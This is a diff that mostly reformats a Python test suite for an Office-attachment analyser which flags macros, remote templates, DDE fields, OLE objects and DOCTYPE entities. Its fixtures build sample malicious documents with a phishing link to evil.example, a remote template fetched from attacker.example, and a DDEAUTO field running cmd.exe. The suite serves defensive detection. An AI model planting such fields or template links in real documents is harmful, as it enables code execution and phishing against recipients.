@@ -4,6 +4,7 @@ extraction, and the dropper flags (macros, remote template, DDE, OLE,
 encryption). Documents are built in memory with zipfile, so the suite
 needs nothing beyond the standard library.
 """
+
 from __future__ import annotations
 
 import base64
@@ -30,7 +31,7 @@ def make_zip(parts: dict[str, str | bytes]) -> bytes:
 
 
 def docx(body: str, extra: dict | None = None) -> bytes:
-    parts = {"word/document.xml": f'<w:document {W}><w:body>{body}</w:body></w:document>'}
+    parts = {"word/document.xml": f"<w:document {W}><w:body>{body}</w:body></w:document>"}
     parts.update(extra or {})
     return make_zip(parts)
 
@@ -75,11 +76,15 @@ class TestDetection:
 # ---------------------------------------------------------------------
 class TestWord:
     def test_text_and_hyperlinks(self):
-        rels = (f'<Relationships {R}><Relationship Id="rId9" '
-                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
-                'Target="https://evil.example/login" TargetMode="External"/></Relationships>')
-        data = docx(para("Please verify your payroll details.") + para("Thank you."),
-                    {"word/_rels/document.xml.rels": rels})
+        rels = (
+            f'<Relationships {R}><Relationship Id="rId9" '
+            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
+            'Target="https://evil.example/login" TargetMode="External"/></Relationships>'
+        )
+        data = docx(
+            para("Please verify your payroll details.") + para("Thank you."),
+            {"word/_rels/document.xml.rels": rels},
+        )
         r = analyse_attachment(b64(data), filename="payroll.docx")
         assert "verify your payroll" in r["extracted_text"]
         assert "https://evil.example/login" in r["extracted_urls"]
@@ -91,22 +96,28 @@ class TestWord:
         assert "contains_macros" in r["notable_features"]
 
     def test_remote_template_flagged(self):
-        rels = (f'<Relationships {R}><Relationship Id="rId1" '
-                'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
-                'Target="http://attacker.example/t.dotm" TargetMode="External"/></Relationships>')
+        rels = (
+            f'<Relationships {R}><Relationship Id="rId1" '
+            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+            'Target="http://attacker.example/t.dotm" TargetMode="External"/></Relationships>'
+        )
         data = docx(para("Report"), {"word/_rels/settings.xml.rels": rels})
         r = analyse_attachment(b64(data), filename="report.docx")
         assert "remote_template" in r["notable_features"]
         assert "http://attacker.example/t.dotm" in r["extracted_urls"]
 
     def test_dde_field_flagged(self):
-        body = ('<w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" '
-                '</w:instrText></w:r></w:p>')
+        body = (
+            '<w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" '
+            "</w:instrText></w:r></w:p>"
+        )
         r = analyse_attachment(b64(docx(body)), filename="x.docx")
         assert "dde_field" in r["notable_features"]
 
     def test_hyperlink_field_code(self):
-        body = '<w:p><w:r><w:instrText> HYPERLINK "https://field.example/a" </w:instrText></w:r></w:p>'
+        body = (
+            '<w:p><w:r><w:instrText> HYPERLINK "https://field.example/a" </w:instrText></w:r></w:p>'
+        )
         r = analyse_attachment(b64(docx(body)), filename="x.docx")
         assert "https://field.example/a" in r["extracted_urls"]
 
@@ -116,8 +127,10 @@ class TestWord:
         assert "embedded_ole_object" in r["notable_features"]
 
     def test_doctype_part_skipped(self):
-        evil = ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]>'
-                f'<w:document {W}><w:body>{para("&lol;")}</w:body></w:document>')
+        evil = (
+            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]>'
+            f"<w:document {W}><w:body>{para('&lol;')}</w:body></w:document>"
+        )
         r = analyse_attachment(b64(make_zip({"word/document.xml": evil})), filename="x.docx")
         assert "suspicious_xml_doctype" in r["notable_features"]
         assert r["extracted_text"] == ""
@@ -128,13 +141,17 @@ class TestWord:
 # ---------------------------------------------------------------------
 class TestExcelPowerPoint:
     def test_xlsx_shared_strings_and_xlm_macros(self):
-        ss = ('<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
-              '<si><t>Bank transfer form</t></si><si><t>https://pay.example/now</t></si></sst>')
-        data = make_zip({
-            "xl/workbook.xml": "<workbook/>",
-            "xl/sharedStrings.xml": ss,
-            "xl/macrosheets/sheet1.xml": "<xm/>",
-        })
+        ss = (
+            '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
+            "<si><t>Bank transfer form</t></si><si><t>https://pay.example/now</t></si></sst>"
+        )
+        data = make_zip(
+            {
+                "xl/workbook.xml": "<workbook/>",
+                "xl/sharedStrings.xml": ss,
+                "xl/macrosheets/sheet1.xml": "<xm/>",
+            }
+        )
         r = analyse_attachment(b64(data), filename="form.xlsx")
         assert r["kind"] == "xlsx"
         assert "Bank transfer form" in r["extracted_text"]
@@ -147,9 +164,11 @@ class TestExcelPowerPoint:
         assert "external_data_connection" in r["notable_features"]
 
     def test_pptx_slide_text(self):
-        slide = ('<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
-                 'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
-                 '<a:p><a:r><a:t>Claim your reward</a:t></a:r></a:p></p:sld>')
+        slide = (
+            '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
+            'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
+            "<a:p><a:r><a:t>Claim your reward</a:t></a:r></a:p></p:sld>"
+        )
         data = make_zip({"ppt/presentation.xml": "<p/>", "ppt/slides/slide1.xml": slide})
         r = analyse_attachment(b64(data), filename="deck.pptx")
         assert r["kind"] == "pptx"
